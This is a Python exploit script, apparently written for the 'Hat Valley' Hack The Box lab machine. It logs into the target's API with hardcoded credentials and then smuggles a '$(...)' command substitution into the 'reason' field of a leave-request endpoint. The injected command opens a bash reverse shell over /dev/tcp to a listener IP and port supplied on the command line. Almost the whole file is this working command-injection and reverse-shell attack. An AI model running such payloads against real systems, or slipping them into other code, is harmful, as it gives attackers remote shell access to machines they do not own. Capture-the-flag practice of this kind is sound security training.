# Note: This script is used to getting a reverse-shell from target 
# Usage: python3 rshell.py ListenIP ListenPort
# warning: Before you run the script make sure your hostfile contain the target hostname. That is "hat-valley.htb"
# Author : @akhil0x8

import requests
import json
import sys

class CommandInjection:	
	def __init__(self,ip,port):
		self.ip = ip
		self.port = port
		self.login = "http://hat-valley.htb/api/login"
		self.auth = {"username":"christopher.jones","password":"chris123"}
		print("[+] Trying to Login")
		response = requests.post(url=self.login,json=self.auth)
		token = json.loads(response.text)
		self.key = token["token"]
		print("[+] Token Received")

	def MakeCommand(self):
		command = f"bash -c \'bash -i >& /dev/tcp/{self.ip}/{self.port} 0>&1\'"
		payload = f"$({command})"
		print("[+] Injecting cmd")
		self.RunCommand(payload)

	def RunCommand(self,cmd,timeout=2):
		cookie = {"token":self.key}
		data = {"reason":cmd,"start":"27/10/2022","end":"27/10/2022"}
		try:
			response = requests.post("http://hat-valley.htb/api/submit-leave",cookies=cookie,json=data,timeout=timeout)
		except :
			pass
		print("[+] Code Executed")


rce = CommandInjection(sys.argv[1],sys.argv[2])
rce.MakeCommand()